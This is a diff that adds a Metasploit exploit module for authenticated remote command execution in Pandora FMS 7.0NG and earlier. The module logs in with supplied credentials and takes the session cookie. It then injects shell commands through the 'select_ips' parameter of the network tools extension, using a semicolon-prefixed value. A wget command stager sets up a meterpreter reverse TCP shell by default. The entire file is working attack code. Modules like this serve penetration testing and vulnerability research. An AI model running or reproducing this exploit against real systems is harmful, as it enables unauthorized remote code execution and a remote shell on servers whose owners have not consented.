@@ -1,0 +1,142 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'Pandora FMS Ping Authenticated Remote Code Execution',
+      'Description'     => %q{
+        This module exploits a vulnerability found in Pandora FMS 7.0NG and lower.
+        net_tools.php in Pandora FMS 7.0NG allows remote attackers to execute arbitrary OS commands.
+      },
+      'Author'          =>
+        [
+          'Onur ER <onur@onurer.net>' # Vulnerability discovery and Metasploit module
+        ],
+      'DisclosureDate'  => '2020-03-09',
+      'License'         => MSF_LICENSE,
+      'Platform'        => 'linux',
+      'Arch'            => [ARCH_X86, ARCH_X64],
+      'Privileged'      => false,
+      'Targets'         =>
+        [
+          ['Automatic Target', {}]
+        ],
+      'DefaultOptions'  =>
+        {
+          'Payload' => 'linux/x86/meterpreter/reverse_tcp'
+        },
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The URI of the vulnerable Pandora FMS instance', '/pandora_console/']),
+        OptString.new('USERNAME', [true, 'The username to authenticate with']),
+        OptString.new('PASSWORD', [true, 'The password to authenticate with'])
+      ]
+    )
+  end
+
+  def check
+    res = send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => normalize_uri(target_uri, 'index.php')
+    })
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    unless res.body =~ /Pandora/i
+      return CheckCode::Safe
+    end
+
+    pandora_version = res.body.scan(/<div id="ver_num">v(.*?)<\/div>/).flatten.first
+    version = Gem::Version.new(pandora_version)
+
+    print_status("Pandora FMS version #{version}") if version
+
+    if Gem::Version.new(version) <= Gem::Version.new('7.0NG')
+      return Exploit::CheckCode::Appears
+    end
+
+    CheckCode::Detected
+  end
+
+  def authenticate
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri, 'index.php'),
+      'vars_get'  => {
+        'login'   => '1'
+      },
+      'vars_post' => {
+        'nick'          => datastore['USERNAME'],
+        'pass'          => datastore['PASSWORD'],
+        'login_button'  => 'Login'
+      }
+    })
+
+    return auth_succeeded?(res)
+  end
+
+  def auth_succeeded?(res)
+    unless res && res.code == 200 && res.body.include?('Welcome to Pandora FMS')
+      print_error('Authentication failed!')
+      return false
+    end
+    print_good('Successfully authenticated')
+    print_status('Attempting to retrieve session cookie')
+    @cookie = res.get_cookies
+    unless @cookie.include?('PHPSESSID')
+      print_error('Error retrieving cookie!')
+      return false
+    end
+    print_good("Successfully retrieved session cookie: #{@cookie}")
+    true
+  end
+
+  def exploit
+    print_status('Exploiting...')
+    execute_cmdstager(flavor: :wget, nospace: true)
+  end
+
+  def execute_command(cmd, opts = {})
+    print_status("Attempting to authenticate using (#{datastore['USERNAME']}:#{datastore['PASSWORD']})")
+    auth = authenticate
+    unless auth
+      fail_with Failure::NoAccess, 'Please provide a valid username and password.'
+    end
+
+    id_agente = 1
+    while !session_created? && id_agente <= 10
+      send_request_cgi({
+        'method'    => 'POST',
+        'uri'       => normalize_uri(target_uri, 'index.php'),
+        'cookie'    => @cookie,
+        'vars_get'  => {
+          'sec'           => 'estado',
+          'sec2'          => 'operation/agentes/ver_agente',
+          'tab'           => 'extension',
+          'id_agente'     => "#{id_agente}",
+          'id_extension'  => 'network_tools'
+        },
+        'vars_post' => {
+          'operation'     => '2',
+          'select_ips'    => ";#{cmd}",
+          'community'     => 'public',
+          'submit'        => 'Execute'
+        }
+      })
+
+      id_agente += 1
+    end
+  end
+end
